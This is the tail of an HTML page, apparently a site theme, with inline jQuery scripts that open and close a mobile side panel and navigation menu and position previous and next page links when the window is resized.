
    </main>

    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(function() {
        var nodes = {
            nav: $('#nav'),
            aside: $('#aside'),
            asideInner: $('#aside-inner'),
            navInner: $('#nav-inner')
        };

        var doing = false;
        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
            if (nodes.aside.hasClass('mobile-open')) {
                nodes.aside.removeClass('mobile-open');
            } else {
                nodes.aside.removeClass('mobile-close panel-show');
            }
            doing = false;
        });
        $('#open-panel, #aside-mask').on('click', function() {
            if (doing) {
                return;
            }

            if (nodes.aside.hasClass('panel-show')) {
                nodes.aside.addClass('mobile-close');
            } else {
                nodes.aside.addClass('mobile-open panel-show');
            }
        });
        $('#open-menus').on('click', function() {
            nodes.navInner.slideToggle('normal', slideDone);
        });

        if (window.innerWidth <= 960) {
            setTimeout(function() {
                nodes.navInner.slideUp('normal', slideDone);
            }, 3000);
        }

        function slideDone() {
            if (nodes.navInner.css('display') !== 'none') {
                nodes.navInner.css('display', '');
            }
        }

        $(window).on('resize', function() {
            if ($(this).width() > 960) {
                nodes.navInner.css('display', '');
            }
        });
    });
    </script>
    
        
<script src="/js/scrollspy.min.js"></script>

        <script type="text/javascript">
        $(document.body).scrollspy({target: '#aside-inner'});

        $(window).on('resize', function() {
            var hw = $('#header').width();
            var ww = $('#wrapper').width();
            var space = ($(this).width() - hw - ww) / 2 / 2;

            var pageprev = $('#pageprev');
            var pagenext = $('#pagenext');
            var avg = (pageprev.width() + pagenext.width()) / 2

            if(space > avg) {
                var len = space - avg / 2;
                var styles = {position: 'fixed', top: '50%', marginTop: - (pageprev.width() + pagenext.width()) / 4}
                pageprev.css($.extend({left: hw + len}, styles));
                pagenext.css($.extend({right: len}, styles));
            } else {
                pageprev.removeAttr('style');
                pagenext.removeAttr('style');
            }
        }).trigger('resize');
        </script>
    

</body>
</html>
